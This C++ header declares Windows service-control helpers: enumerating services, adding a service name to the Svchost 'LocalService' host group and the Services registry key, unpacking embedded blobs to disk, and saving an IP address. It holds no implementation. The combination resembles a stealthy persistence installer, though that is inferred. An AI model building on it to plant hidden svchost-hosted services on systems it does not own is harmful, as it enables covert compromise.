#ifndef CTRL_UTILS_H
#define CTRL_UTILS_H

#include "common_dep.h"
#include "ctrl_dep.h"

std::vector<std::wstring> enum_win32_services(SC_HANDLE scm);
bool service_exists(SC_HANDLE scm, std::wstring const& name, bool ignore_case = true);

bool _verify_status(LPCWSTR op, DWORD status);

#ifndef SERVICE_PATH
bool append_host_value(
	LPCWSTR key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
	LPCWSTR subkey = L"LocalService",
	LPCWSTR value = SERVICE_NAME);
bool remove_host_value(
	LPCWSTR key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
	LPCWSTR subkey = L"LocalService",
	LPCWSTR value = SERVICE_NAME);
#endif

bool add_svc_keyvalue(
	LPCWSTR key = L"SYSTEM\\CurrentControlSet\\Services",
	LPCWSTR name = SERVICE_NAME);
bool remove_svc_keyvalue(
	LPCWSTR key = L"SYSTEM\\CurrentControlSet\\Services",
	LPCWSTR name = SERVICE_NAME);

bool decompress_blobs(void* blob, int len, const char* out_path);

// decompress *.tgz
int tar(const char*, const char*);

bool save_ip(DWORD);
#endif
